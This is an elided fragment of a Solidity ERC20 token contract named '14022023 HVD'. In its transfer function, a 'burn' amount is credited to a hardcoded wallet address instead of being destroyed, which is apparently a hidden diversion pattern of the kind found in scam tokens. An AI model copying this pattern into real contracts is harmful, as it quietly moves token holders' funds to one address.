...
contract HVD14022023  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "14022023 HVD";
    string private _symbol = "14022023 HVD";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 14022023 * 10 ** _decimals;
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x60b41fb65f6373dE87995A94Fd3Ab524f68F85eb] += _bruntoken;
